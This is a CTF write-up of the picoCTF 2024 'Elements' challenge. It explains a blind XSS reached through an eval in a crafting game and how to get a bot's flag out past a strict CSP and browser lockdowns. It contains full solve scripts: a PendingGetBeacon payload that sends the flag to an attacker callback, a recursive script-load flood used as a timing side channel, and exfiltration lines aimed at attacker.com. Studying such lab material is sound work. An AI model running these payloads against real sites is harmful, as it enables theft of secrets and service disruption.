---
title: "picoCTF 2024 — Elements"
date: 2024-03-01
tags: [web, blind-xss, csp-bypass, picoctf]
ctf: "picoCTF 2024"
summary: "A blind XSS + strict CSP bypass challenge. Data exfiltration from a headless Chrome bot using DNS/WebRTC restrictions, requiring creative side-channels."
draft: false
---


**Author:** ehhthing
**Solves:** 39 (second least solved challenge in picoCTF 2024)

---
## What Kind of Challenge This Is

This is a **blind XSS + CSP bypass** challenge. You never attack the app in your own browser. Instead:

1. You send a crafted payload to a `/remoteCraft` endpoint.
2. The server spawns a real headless Chromium browser (the "bot") that holds the flag in its memory.
3. The bot visits the game page with your payload embedded in the URL.
4. Your payload must make the bot's browser execute JavaScript that reads the flag and sends it to you.

The difficulty is not finding the XSS that part is relatively straightforward once you read the code. The difficulty is **getting data out** of a browser that is locked down at every possible level: CSP, enterprise browser policies, DNS prediction disabled, and a custom-patched Chromium with WebRTC removed.

This pattern (you submit payload, bot visits it with a secret, you need to leak the secret) is called a **bot/admin-visit** challenge and is very common in real bug bounty too (e.g. stored XSS in a ticket system, admin bot reviews the ticket).

---

## File-by-File Breakdown

### `index.html`  The Game Frontend

A minimal HTML file that loads `index.js` as an ES module. Has a sidebar div for elements, a search/filter input, and a hidden "online mode" checkbox. Nothing security-relevant here on its own — just the container for the game.

---

### `index.js`  The Game Logic (our Injection Target)

This is the most important file to understand deeply. It runs **inside the bot's browser**.

#### The recipes array

```javascript
const recipes = [
    ["Ash","Fire","Charcoal"],
    ["Exploit","Web Design","XSS"],
    // ... 130+ more
];
```

Each entry is `[ingredientA, ingredientB, result]`. Two ingredients combine to produce a result. The game starts with four base elements: Fire, Water, Earth, Air. Everything else must be derived by combining.

#### The elements Map

Maps element names to their emoji. The combination of `recipes` and `elements` defines the entire game graph.

#### The `found` Map and localStorage

```javascript
let found = new Map([['Fire','🔥'],['Water','💧'],['Earth','🌍'],['Air','💨']]);
if (localStorage.getItem('found')) {
    found = new Map(JSON.parse(localStorage.getItem('found')));
}
```

Tracks which elements the player has discovered. Persists across sessions via localStorage. For your attack, this doesn't matter  the bot has a fresh profile each time.

#### The `state` object and URL hash parsing

```javascript
try {
    state = JSON.parse(atob(window.location.hash.slice(1)));
    for (const [a, b] of state.recipe) {
        if (!found.has(a) || !found.has(b)) break;
        const result = evaluate(a, b);
        found.set(result, elements.get(result));
    }
} catch(e) {}
```

This is the entire attack surface entry point.

- `window.location.hash` is the part of the URL after `#`
- `.slice(1)` strips the `#` character itself
- `atob(...)` base64-decodes the string
- `JSON.parse(...)` turns it into a JavaScript object

So if the URL is `http://127.0.0.1:8080/#eyJ4c3MiOiJhbGVydCgxKSJ9`, the code decodes that to `{"xss":"alert(1)"}` and stores it in `state`.

The loop then automatically replays `state.recipe`  a list of `[elementA, elementB]` pairs calling `evaluate()` for each one, simulating the player combining elements one at a time in order. This is the mechanism that gets you from base elements all the way to crafting `"XSS"` without anyone clicking anything.

#### The `evaluate()` function the XSS trigger

```javascript
const evaluate = (...items) => {
    const [a, b] = items.sort();
    for (const [ingredientA, ingredientB, result] of recipes) {
        if (ingredientA === a && ingredientB == b) {
            if (result === 'XSS' && state.xss) {
                eval(state.xss);
            }
            return result;
        }
    }
    return null;
}
```

When two elements are combined:
1. They get sorted alphabetically (so order doesn't matter).
2. The recipes list is searched for a matching pair.
3. If the result would be `"XSS"` AND `state.xss` is a non-empty string, **your code runs**.

`eval(state.xss)`  `state.xss` is fully attacker-controlled (you set it in the base64-encoded JSON you put in the URL hash). So you have arbitrary JavaScript execution inside the bot's browser at the moment `XSS` gets crafted.

  (loose equality) on the second ingredient check. This matters for the type-bug bypass explained later.

---

### `index.mjs` The Bot Server (our Actual Target)

This is the Node.js server that runs on port 8080. It has three routes.

#### Route: `GET /` and `GET /index.js`

Just serves the HTML and JS files. Sets security headers (including CSP) on every response.

#### The CSP headers

```javascript
const csp = [
    "default-src 'none'",
    "style-src 'unsafe-inline'",
    "script-src 'unsafe-eval' 'self'",
    "frame-ancestors 'none'",
    "worker-src 'none'",
    "navigate-to 'none'"
];

if (req.headers.host !== '127.0.0.1:8080') {
    csp.push("connect-src https://elements.attest.lol/");
}
```

This is critically important:

- `default-src 'none'`  blocks everything not explicitly allowed
- `style-src 'unsafe-inline'` inline styles allowed (not directly useful for exfil)
- `script-src 'unsafe-eval' 'self'`  `eval()` is allowed (necessary for the XSS to work), and scripts can load from the same origin
- `frame-ancestors 'none'` — can't be embedded in an iframe
- `worker-src 'none'` — no Web Workers
- `navigate-to 'none'` — page cannot navigate to any URL

The conditional on `req.headers.host` is subtle and important: if the request comes from anyone other than `127.0.0.1:8080`, they get `connect-src https://elements.attest.lol/` added. But the bot visits via `127.0.0.1:8080`, so **the bot's page never gets a connect-src directive**. When `connect-src` is absent, it falls back to `default-src 'none'`. This means **fetch, XHR, and WebSocket are all blocked for the bot** with no exceptions.

#### Route: `GET /remoteCraft`  The Attack Endpoint

```javascript
const { recipe, xss } = JSON.parse(url.searchParams.get('recipe'));
assert(typeof xss === 'string');
assert(xss.length < 300);
assert(recipe instanceof Array);
assert(recipe.length < 50);
for (const step of recipe) {
    assert(step instanceof Array);
    assert(step.length === 2);
    for (const element of step) {
        assert(typeof xss === 'string');  // BUG: should be typeof element
        assert(element.length < 50);
    }
}
visit({ recipe, xss });
```

You send your payload here. Constraints: xss under 300 chars, recipe under 50 steps, each step is a 2-element array, each element's `.length` under 50.

**The validation bug:** Inside the inner loop, `typeof xss === 'string'` is checked instead of `typeof element === 'string'`. This means the type of individual recipe elements is never validated. A JavaScript object like `{"length": 0}` has `.length` (it's 0, which is less than 50), so it passes the check. This allows non-string objects to be passed as recipe ingredients.

#### The `visit()` function

```javascript
async function visit(state) {
    if (visiting) return;
    visiting = true;

    state = {...state, flag}

    const userDataDir = await mkdtemp(join(tmpdir(), 'elements-'));
    await mkdir(join(userDataDir, 'Default'));
    await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({
        net: { network_prediction_options: 2 }
    }));

    const proc = spawn('/usr/bin/chromium-browser-unstable', [
        `--user-data-dir=${userDataDir}`,
        '--profile-directory=Default',
        '--no-sandbox',
        '--js-flags=--noexpose_wasm,--jitless',
        '--disable-gpu',
        '--no-first-run',
        '--enable-experimental-web-platform-features',
        `http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}`
    ]);

    await sleep(10000);
    try { process.kill(-proc.pid) } catch(e) {}
    await sleep(500);
    await rm(userDataDir, { recursive: true, force: true, maxRetries: 10 });
    visiting = false;
}
```

Key things happening here:

1. `state = {...state, flag}` —the real flag is merged into the state object. Now `state.flag` contains the actual flag string.
2. A temporary Chrome profile directory is created fresh every time (no persistent session data between bot visits).
3. A Chrome preferences file is written with `network_prediction_options: 2`  this disables all DNS prefetching and network prediction, killing that exfil vector before the browser even opens.
4. The browser is spawned with `--enable-experimental-web-platform-features` this is the author planting the hint/key.
5. `--js-flags=--noexpose_wasm,--jitless`  WebAssembly is hidden, JIT compilation is disabled. The `--jitless` flag is a message: "don't bother trying to exploit the browser engine's JIT compiler." You're not expected to do a browser exploit.
6. The bot visits the game page with `#<base64(JSON(state))>` in the URL. Because `state` now includes the flag, the page's JS can read it via `state.flag` after parsing the hash.
7. After 10 seconds, the bot process is killed and the profile directory is deleted.

---

### `chromium.diff`  The Custom Browser Patch

```diff
- Exposed=Window,
- LegacyWindowAlias=webkitRTCPeerConnection,
- LegacyWindowAlias_Measure
+ ActiveScriptWrappable
```

This patch modifies the WebRTC IDL (Interface Definition Language) file for `RTCPeerConnection`. By removing `Exposed=Window`, the `RTCPeerConnection` class is no longer exposed to the `window` object in JavaScript. In the patched browser, `window.RTCPeerConnection` is `undefined`.

Why does this matter? WebRTC's ICE (Interactive Connectivity Establishment) mechanism is famous for bypassing CSP `connect-src`. When you create an `RTCPeerConnection` with a STUN server URL pointing at your own server, the browser makes network requests to that URL **outside the CSP connect-src restriction**, because STUN traffic goes through a different network pathway than HTTP. This is a well-documented CSP bypass used in many CTFs and bug bounties.

The challenge author patched this out explicitly, as a clear signal: "I know about this, I closed it, don't try it."

---

### `policy.json`  Chrome Enterprise Policy

```json
{"URLAllowlist":["127.0.0.1:8080"],"URLBlocklist":["*"]}
```

This file is placed at `/etc/chromium/policies/managed/policy.json` (from the Dockerfile). Chrome Enterprise policies are enforced at the browser level, outside JavaScript's reach they cannot be bypassed by any JavaScript API or CSP trick. These are the same policies used to manage corporate browser fleets.

What it does:
- `URLBlocklist: ["*"]` — blocks the browser from navigating to or loading resources from any URL
- `URLAllowlist: ["127.0.0.1:8080"]` — then pokes a single hole: only `127.0.0.1:8080` is reachable

This is a second, independent layer of defense. Even if you found a CSP bypass or a browser API that ignored CSP, the enterprise policy would still prevent the request from going through, because the policy operates at the network stack level, not the renderer level.

The combination of CSP + enterprise policy means even finding a zero-day CSP bypass wouldn't help unless it also bypassed the enterprise policy.

---

### `Dockerfile` The Container Setup

```dockerfile
FROM --platform=amd64 node:21-bookworm-slim
ADD chrome.deb /tmp/chrome.deb
RUN apt-get update && apt-get install -y /tmp/chrome.deb && apt-get install -y xvfb
WORKDIR /app
COPY flag.txt .
COPY index.mjs start_display.sh ./
COPY static ./static
COPY policy.json /etc/chromium/policies/managed/policy.json
CMD ./start_display.sh & DISPLAY=:99.0 su node -c "node index.mjs"
```

Key observations:
- The custom-patched `chrome.deb` is installed  this is the modified Chromium without `RTCPeerConnection`.
- `xvfb` (X Virtual Frame Buffer) is installed —
- this creates a virtual display so Chromium can run headlessly without a real monitor.
- `flag.txt` is copied into the container's working directory, where `index.mjs` reads it.
- `policy.json` is placed at the managed policy path.

---

### `start_display.sh` — The Virtual Display

```bash
rm -f /tmp/.X99-lock
while true
do
    Xvfb -ac :99 -screen 0 1280x720x16
done
```

Runs `Xvfb` in an infinite loop on display `:99` at 1280x720x16-bit color. The `while true` is needed because Xvfb can crash; the loop restarts it. The bot server uses `DISPLAY=:99.0` so Chromium renders to this virtual display.

---

## Core Concepts You Must Understand

### URL Fragment (Hash)

A URL has several parts:

```
https://example.com:8080/path?query=value#fragment
                                          ^
                                          This is the fragment
```

The fragment (everything after `#`) was originally designed for anchor navigation within a page (like `page.html#section2` scrolling to `<h2 id="section2">`). Because it was designed for client-side use only, browsers made a fundamental architectural decision: **the fragment is never sent in the HTTP request**. The server never sees it.

When your browser makes a GET request to `http://127.0.0.1:8080/#eyJmbGFnIjoic2VjcmV0In0=`, the actual HTTP request on the wire is:

```
GET / HTTP/1.1
Host: 127.0.0.1:8080
```

No fragment. It simply does not travel over the network. It stays in the browser, accessible only to JavaScript via `window.location.hash`.

This is why the bot server puts the flag in the fragment: it's a way to pass data to client-side JavaScript that never appears in any server-side log, any proxy log, any `Referer` header from outgoing requests, or any CDN/cache. The flag goes browser-to-browser-memory, never touching a network log.

Compare with query string (`?flag=secret`): that DOES go in the HTTP request, appears in server logs, appears in `Referer` headers if the page makes any external requests. Never put secrets in query strings.

### eval() and Code Injection

`eval(string)` takes a string and executes it as JavaScript code in the current scope. In `index.js`:

```javascript
if (result === 'XSS' && state.xss) {
    eval(state.xss);
}
```

At the moment `eval()` runs:
- `state` is in scope, meaning `state.flag` is accessible
- `found`, `elements`, `recipes` are in scope
- The DOM is accessible (`document`, `window`)
- Any JavaScript you want to run can go in `state.xss`

This is a full arbitrary code execution context. The only constraint is getting your code to actually exfiltrate data out of the browser, which is where CSP and the enterprise policy become the real challenge.

### Content Security Policy (CSP)

CSP is a browser security feature where the server sends an HTTP header telling the browser what it's allowed to do. The browser enforces these restrictions. JavaScript itself cannot override CSP — the enforcement happens in the browser's own code, outside JS's reach.

Directives:
- `default-src 'none'` — the catch-all fallback: block everything not explicitly permitted
- `script-src 'self' 'unsafe-eval'` — scripts can only load from the same origin, and `eval()` is permitted
- `connect-src` — controls fetch, XHR, WebSocket, EventSource. If absent, falls back to `default-src`
- `navigate-to` — controls where the page can navigate (location.href = "...")
- `style-src 'unsafe-inline'` — inline style attributes and style blocks are allowed
- `worker-src 'none'` — no Web Workers or Service Workers
- `frame-ancestors 'none'` — this page cannot be embedded in an iframe on any other page

For this challenge, with `default-src 'none'` and no `connect-src`, the bot's page cannot make any fetch request, any XHR request, any WebSocket connection, or send any beacon (normally). It cannot navigate anywhere (navigate-to 'none'). It cannot load any external resources.

### Topological Sorting

To reach "XSS" in the recipe graph, you need to craft "Exploit" and "Web Design" first. But those themselves require ingredients, which require their own ingredients, all the way back to the four base elements.

This is a **dependency graph** problem. "XSS" depends on "Exploit" and "Web Design". "Exploit" depends on "Cybersecurity" and "Vulnerability". And so on.

A **topological sort** of a directed acyclic graph (DAG) produces an ordering where every node appears after all its dependencies. This is exactly what you need: a recipe order where every ingredient is available before you try to use it.

Python's `graphlib.TopologicalSorter` handles this automatically.

### Side-Channel Attacks

A side-channel attack extracts secret information not by directly reading it, but by observing an indirect, physical effect of a computation  timing, power consumption, electromagnetic radiation, etc.

In this challenge: if you can make the bot's browser do something that takes noticeably longer (or causes the server to respond slower) when a condition involving the flag is true versus false, you can infer information about the flag one bit at a time, using the **server's response time as a covert information channel**.

Binary search reduces the number of questions needed. To find a character with ASCII value 0-127, a linear search takes up to 127 guesses. Binary search takes only 7 (log2(128) = 7). For a flag of ~130 characters, that's 130 * 7 = 910 questions. At ~12 seconds per question, that's roughly 3 hours.

---

## The Vulnerability Chain
## Step 1  Crafting the Recipe Chain

we need a valid ordered list of ingredient pairs that, when replayed from the four base elements, results in "XSS" being crafted.

### Building the dependency graph manually

Tracing this by hand is error-prone. Use Python.

### Building with code (topological sort)

```python
import graphlib

recipes = [
    ["Ash","Fire","Charcoal"],
    ["Steam Engine","Water","Vapor"],
    # ... all recipes from index.js ...
    ["Exploit","Web Design","XSS"]
]

# Build a map: result → [ingredientA, ingredientB]
dependencies = {}
for r in recipes:
    dependencies[r[2]] = [r[0], r[1]]

# Base elements — already available, not derived
orig = ['Fire', 'Water', 'Earth', 'Air']

# Trace all dependencies needed to reach "XSS"
dep_graph = {}
def trace_dependency(dep):
    if dep in dep_graph or dep not in dependencies:
        return
    dep_graph[dep] = set(dependencies[dep])
    for d in dependencies[dep]:
        if d not in orig:
            trace_dependency(d)

trace_dependency("XSS")

# Topological sort gives a valid ordering
ts = graphlib.TopologicalSorter(dep_graph)
res_order = list(ts.static_order())

# Extract just the ingredient pairs in order
chain = [dependencies[k] for k in res_order if k in dependencies]
print(chain)
```

Output the exact `recipe` array to send:

```python
[
    ['Earth', 'Fire'],
    ['Earth', 'Water'],
    ['Air', 'Water'],
    ['Air', 'Earth'],
    ['Magma', 'Mud'],
    ['Fire', 'Mist'],
    ['Magma', 'Mist'],
    ['Earth', 'Obsidian'],
    ['Obsidian', 'Water'],
    ['Fog', 'Mud'],
    ['Air', 'Rock'],
    ['Computer Chip', 'Fire'],
    ['Hot Spring', 'Sludge'],
    ['Computer Chip', 'Steam Engine'],
    ['Hot Spring', 'Steam Engine'],
    ['Fire', 'Steam Engine'],
    ['Artificial Intelligence', 'Data'],
    ['Computer Chip', 'Electricity'],
    ['Dust', 'Heat Engine'],
    ['Encryption', 'Software'],
    ['Computer Chip', 'Software'],
    ['Fire', 'Sand'],
    ['Internet', 'Program'],
    ['Glass', 'Software'],
    ['Cybersecurity', 'Vulnerability'],
    ['Exploit', 'Web Design']
]
```

26 steps, well under the server's limit of 50.

### Alternative: Exploit the Type Validation Bug

Because the inner loop checks `typeof xss` instead of `typeof element`, you can pass objects as ingredients. JavaScript objects can have a custom `.toString()` method, and the `evaluate()` function uses loose equality ==   for the second ingredient, which calls `.toString()` on objects during comparison
```json
{
    "recipe": [["Exploit", {"length": 8, "toString": "Web Design"}]],
    "xss": "alert(1)"
}
```

When `evaluate("Exploit", {"length": 8, "toString": "Web Design"})` runs:
1. Items get sorted. `"Exploit"` and the object get sorted (string comparison vs object).
2. The recipe check: `ingredientB == b` uses loose.
3. With loose equality, the object's `toString()` would be compared.

This bypasses needing to build the full dependency chain, though it requires more careful handling of how JavaScript sorts mixed types. The full topological approach is cleaner for a real solve.

---

## Step 2  Exfiltration: Every Path and Why Most Fail

Once your JS runs inside the bot's browser with `state.flag` available, you need to get that string to yourself. Here is every attempted method and why it succeeds or fails.

### fetch() / XMLHttpRequest BLOCKED by CSP

```javascript
fetch('https://attacker.com/?flag=' + state.flag)
```

`fetch` respects `connect-src`. With `connect-src` absent and `default-src 'none'`, the browser blocks this before any network packet leaves. The request is never made.

### Image beacon  BLOCKED by CSP

```javascript
new Image().src = 'https://attacker.com/?flag=' + state.flag
```

Image loading is controlled by `img-src`. No `img-src` directive → falls back to `default-src 'none'` → blocked.

### CSS injection LIMITED

`style-src 'unsafe-inline'` is allowed, meaning you can set styles. CSS-based exfiltration techniques like `@font-face` with external `src` or `background-image: url(...)` are both network requests, blocked by `default-src 'none'`. CSS can only tell you if something matches a selector, not leak arbitrary string content.

### window.location.href navigation BLOCKED by CSP

```javascript
window.location.href = 'https://attacker.com/?flag=' + state.flag
```

`navigate-to 'none'` explicitly blocks all navigation. The browser refuses.

### Web Workers / Service Workers  BLOCKED by CSP

`worker-src 'none'` explicitly blocks both.

### DNS prefetching  BLOCKED by Chrome Preferences

```javascript
var link = document.createElement('link');
link.rel = 'dns-prefetch';
link.href = '//FLAG.attacker.com';
document.head.appendChild(link);
```

The Chromium Preferences file written by `visit()` sets `network_prediction_options: 2`, which disables all network prediction including DNS prefetching. Even if you inject the link tag, no DNS lookup is made.

### WebRTC ICE/STUN  BLOCKED by custom Chromium patch

```javascript
var pc = new RTCPeerConnection({
    iceServers: [{urls: 'stun:FLAG.attacker.com:3478'}]
});
```

`RTCPeerConnection` is `undefined` in the patched browser. The patch removed it from the `window` object entirely. This would have otherwise been a very reliable CSP bypass.

### script tag to same origin POSSIBLE (server log exfil)

```javascript
var s = document.createElement('script');
s.src = '/?' + state.flag;
document.head.appendChild(s);
```

`script-src 'self'` is allowed. This makes the browser request `http://127.0.0.1:8080/?picoCTF{...}`. The server's access log would contain this URL. However, you don't have direct access to the server's logs  this only works if you control the server instance and can read its stdout.

---

## Solution A  PendingBeacon CSP Bypass

### Discovery

The Chromium launch command includes `--enable-experimental-web-platform-features`. This flag enables a large set of browser APIs that are not yet stable or fully standardized. The key insight: **experimental APIs often haven't had their security review completed**, and specifically may not yet be hooked into CSP enforcement.

To find which APIs this flag enables, you'd look at Chromium's `runtime_enabled_features.json5` file and search for entries with `"status": "experimental"`. Among these is **PendingBeacon**.

### What PendingBeacon is

The Beacon API (`navigator.sendBeacon()`) lets you reliably send analytics data even when a page is unloading. `PendingBeacon` was an experimental extension that let you queue a beacon for later sending with more control. The key property: **at the time of this CTF, `PendingGetBeacon` did not enforce CSP `connect-src`**. It was a new enough API that the CSP integration hadn't been implemented.

Note: `PendingBeacon` has since been deprecated and replaced by the `fetchLater` API, but the principle remains: experimental APIs often bypass security restrictions that are properly enforced on stable APIs.

### The Payload

```javascript
let pb = new PendingGetBeacon(`https://YOUR_SERVER/${state.flag}`);
pb.sendNow();
```

This is only 88 characters — well under the 300-character limit.

When the bot's browser executes this:
1. A `PendingGetBeacon` is created with your server's URL and the flag in the path
2. `sendNow()` fires it immediately
3. The browser makes a GET request to `https://YOUR_SERVER/picoCTF{...}`
4. Your server receives the request; the flag is in the URL path

### Setting Up the Listener

Use ngrok to expose a local server:

```bash
# Terminal 1: start a simple listener
python3 -m http.server 8000

# Terminal 2: expose it
ngrok http 8000
# Note the https://xxxx.ngrok-free.app URL
```

Or use a service like `interactsh` or `requestbin` for the listener.

### The Full Solve Script

```python
import requests
import json

js_code = """
let pb = new PendingGetBeacon(`https://YOUR_NGROK_URL/${state.flag}`);
pb.sendNow();
"""

recipe = [
    ['Earth', 'Fire'],
    ['Earth', 'Water'],
    ['Air', 'Water'],
    ['Air', 'Earth'],
    ['Magma', 'Mud'],
    ['Fire', 'Mist'],
    ['Magma', 'Mist'],
    ['Earth', 'Obsidian'],
    ['Obsidian', 'Water'],
    ['Fog', 'Mud'],
    ['Air', 'Rock'],
    ['Computer Chip', 'Fire'],
    ['Hot Spring', 'Sludge'],
    ['Computer Chip', 'Steam Engine'],
    ['Hot Spring', 'Steam Engine'],
    ['Fire', 'Steam Engine'],
    ['Artificial Intelligence', 'Data'],
    ['Computer Chip', 'Electricity'],
    ['Dust', 'Heat Engine'],
    ['Encryption', 'Software'],
    ['Computer Chip', 'Software'],
    ['Fire', 'Sand'],
    ['Internet', 'Program'],
    ['Glass', 'Software'],
    ['Cybersecurity', 'Vulnerability'],
    ['Exploit', 'Web Design']
]

payload = {
    "xss": js_code.strip(),
    "recipe": recipe
}

r = requests.get(
    "http://TARGET:PORT/remoteCraft",
    params={'recipe': json.dumps(payload)}
)
print(r.text)  # Should print "visiting!"
# Then watch your ngrok/listener logs for the incoming request with the flag in the path
```

Time from sending the request to receiving the flag: approximately 5–10 seconds.

---

## Solution B —Timing Side-Channel Attack

This is the alternative solution when no API-level CSP bypass is available. It requires no external server  the exfiltration channel is the server's own response time.

### The Core Idea

The bot's browser can load scripts from the same origin (`script-src 'self'`). Crucially, loading a script from `/remoteCraft` triggers another bot visit, which causes the server to be busy handling the recursive bot visit. A busy server responds to your polling requests more slowly. You can **observe this slowdown from outside** by measuring how long `GET /` takes from your machine.

If you make the bot create many recursive self-loading scripts **only when a condition about the flag is true**, then:

- **Condition is true** → bot floods server with requests → server is slow → you measure high latency
- **Condition is false** → bot does nothing → server is idle → you measure normal latency

This is a **timing side-channel**: the secret leaks through time measurements, not through direct data transmission.

### The Flood Payload

```javascript
let t = () => {
    let s = document.createElement("script");
    s.src = `/remoteCraft?recipe=${new Date / 1}`;  // unique URL per request
    s.async = true;
    s.onerror = t;  // when the script 404s or errors, create another one
    document.head.appendChild(s);
};

const d = () => {
    for (let i = 0; i < 30; i++) t()
};

CONDITION && d()
```

Where `CONDITION` is something like `state.flag.charCodeAt(5) >= 112`.

When `CONDITION` is true:
- 30 script tags are created immediately, each requesting `/remoteCraft`
- Each `/remoteCraft` response triggers another bot visit (or errors, triggering `t()` again recursively)
- The server is hammered with bot-visit requests, becoming slow for 10 seconds

When `CONDITION` is false:
- `d()` is never called
- Nothing happens

### Measuring Responsiveness from the Outside

```python
import requests
import time
from statistics import mean

session = requests.Session()

def measure_latency(url, samples=5):
    times = []
    for _ in range(samples):
        start = time.perf_counter()
        session.get(url)
        times.append(time.perf_counter() - start)
    return mean(times)

baseline = measure_latency("http://TARGET:PORT/")
# Establish a baseline of ~0.05 seconds when server is idle

# After triggering the conditional flood:
# Flood scenario: ~1.5 seconds response time
# Threshold: baseline * 1.4 (40% slower indicates flooding)
```

### Binary Search Protocol

For each character of the flag, you need its ASCII value. ASCII printable characters are 32–126. Binary search finds the value in 7 yes/no questions.

For each question:
1. Send payload with `CONDITION = charCode >= mid`
2. Wait 2 seconds for the bot to start loading
3. Measure 5 latency samples (takes ~5 seconds)
4. Wait 5 more seconds for the bot to die
5. Total: ~12 seconds per question

```python
def binary_search(oracle, lo, hi):
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(mid):
            hi = mid
        else:
            lo = mid + 1
    return lo

def leak_char_at(index):
    def check(mid):
        condition = f"state.flag.charCodeAt({index}) >= {mid}"
        # Build and send payload with this condition
        trigger_flood(condition)
        time.sleep(2)
        t = measure_latency("http://TARGET:PORT/", samples=5)
        time.sleep(5)
        return t > baseline * 1.4

    return chr(binary_search(check, 32, 127))

# First find flag length
flag_length = binary_search(
    lambda mid: trigger_and_measure(f"state.flag.length >= {mid}"),
    1, 200
)

# Then leak each character
flag = ""
for i in range(flag_length):
    flag += leak_char_at(i)
    print(flag)  # Print progress as you go
```

### Timing Requirements

- 1 bit = 12 seconds
- 1 character = 7 questions = 84 seconds
- 130-character flag = 910 questions = 10,920 seconds = ~3 hours

Practical considerations:
- Run from the same AWS region as the challenge server (e.g., us-east-2) to reduce baseline latency variance
- Baseline latency should be stable: ~50ms, not 200ms+
- If the server restarts (challenge expires), you can resume from where you stopped by hardcoding `known_prefix` and checking `state.flag.startsWith(prefix)` first

### Why This Works Despite All the Security Controls

- No fetch/XHR/WebSocket (CSP blocks)
- No navigation (navigate-to 'none' blocks)
- No DNS (network_prediction_options: 2 blocks)
- No WebRTC (Chromium patch removes it)
- No cross-origin images (default-src 'none' blocks)

But you are:
- Loading scripts from same origin (`script-src 'self'` — allowed)
- Each script load is a legitimate same-origin HTTP request
- The server's own processing load is a physical effect you can measure externally
- No CSP directive blocks "make the server busy"

The information channel is: **server response time → your clock**, which exists entirely outside the browser's security model.

---

## Security Controls and How Each Was Bypassed

| Control | Mechanism | Bypass Method |
|---|---|---|
| CSP default-src none | Blocks all resource loading | Overridden by specific directives for scripts |
| CSP connect-src absent | No fetch/XHR | PendingBeacon ignores connect-src; timing side-channel never uses HTTP directly |
| CSP navigate-to none | No navigation | Not needed for either solution |
| CSP worker-src none | No workers | Not needed |
| network_prediction_options 2 | No DNS prefetch | PendingBeacon and timing attack don't use DNS prefetch |
| RTCPeerConnection removed | No WebRTC | Not needed for PendingBeacon or timing solutions |
| URLBlocklist all | No cross-origin network at OS level | PendingBeacon was a browser-level bug predating policy integration; timing attack is same-origin only |
| Validation type bug | Checked xss not element | Allows object injection into recipe steps |
| 300-char xss limit | Short payload required | PendingBeacon payload is ~88 chars; timing payload uses minified JS |
| 50-step recipe limit | Short chain required | 26 steps needed, 24 under the limit |
| Fresh profile per visit | No session persistence | Doesn't matter — flag is in-memory state, not cookies |
| JIT disabled (--jitless) | No JIT exploitation | Not needed |
| WASM hidden (--noexpose_wasm) | No WebAssembly | Not needed |

---

## Full Solve Script

```python
import requests
import json

TARGET = "http://TARGET:PORT"
CALLBACK = "https://YOUR_NGROK_URL"

recipe = [
    ['Earth', 'Fire'], ['Earth', 'Water'], ['Air', 'Water'], ['Air', 'Earth'],
    ['Magma', 'Mud'], ['Fire', 'Mist'], ['Magma', 'Mist'], ['Earth', 'Obsidian'],
    ['Obsidian', 'Water'], ['Fog', 'Mud'], ['Air', 'Rock'], ['Computer Chip', 'Fire'],
    ['Hot Spring', 'Sludge'], ['Computer Chip', 'Steam Engine'], ['Hot Spring', 'Steam Engine'],
    ['Fire', 'Steam Engine'], ['Artificial Intelligence', 'Data'], ['Computer Chip', 'Electricity'],
    ['Dust', 'Heat Engine'], ['Encryption', 'Software'], ['Computer Chip', 'Software'],
    ['Fire', 'Sand'], ['Internet', 'Program'], ['Glass', 'Software'],
    ['Cybersecurity', 'Vulnerability'], ['Exploit', 'Web Design']
]

xss = f"let pb=new PendingGetBeacon(`{CALLBACK}/${{state.flag}}`);pb.sendNow();"

payload = {"xss": xss, "recipe": recipe}

r = requests.get(TARGET + "/remoteCraft", params={"recipe": json.dumps(payload)})
print(r.text)
# If it prints "visiting!" — watch your ngrok logs for the flag
# If it prints "invalid recipe!" — check your recipe for errors
```

---

## Lessons and Takeaways

### On CSP

CSP is not a complete defense against XSS  it is a damage-reduction layer. If XSS exists, CSP makes exfiltration harder, not impossible. The weakest link in CSP is experimental browser features that haven't gone through full security review. `--enable-experimental-web-platform-features` is a major red flag in any CTF bot setup.

Always check `script-src 'self'` as a potential exfiltration path even when `connect-src` is locked down, because script loading is an HTTP request you can observe server-side.

### On Reading Code

The type bug (`typeof xss` instead of `typeof element`) was subtle and required reading the validation loop carefully. In real codebases and in CTFs, bugs are often one-word mistakes. Read every line.

The `--enable-experimental-web-platform-features` flag was sitting in the Chromium launch arguments. Reading the server code thoroughly — not just the frontend — was essential.

### On Timing Attacks

Timing side-channels are practical, not just theoretical. 3 hours is a long time but it is finite and achievable. The technique of using binary search to reduce an O(n) problem to O(log n) is fundamental — 7 questions per character instead of 127 is the difference between practical and impractical.

The measurement environment matters. Running your timing script from a machine in the same cloud region as the server dramatically reduces latency noise and makes the threshold more reliable.

### On Methodology

When you have code execution (eval runs) but can't exfiltrate:

1. Read every CSP directive and understand exactly what is and isn't allowed
2. Check every Chrome flag and preference for hints about what the intended solution touches
3. Enumerate same-origin channels (script tags, CSS, fetch to same origin)
4. Look for experimental APIs if `--enable-experimental-web-platform-features` is present
5. If all direct exfil is blocked, think about side-channels: timing, cache, resource loading behavior
6. Binary search is your friend for any bit-by-bit leakage scenario

### On Challenge Design

This challenge was intentionally layered: the author patched out WebRTC, disabled DNS prediction, added an enterprise policy, AND added CSP four independent layers. When you see that many defenses stacked, the intended bypass is usually something that predates the security review for those defenses (a new experimental API), not a clever combination of bypassing multiple layers. One layer was left intentionally thin.

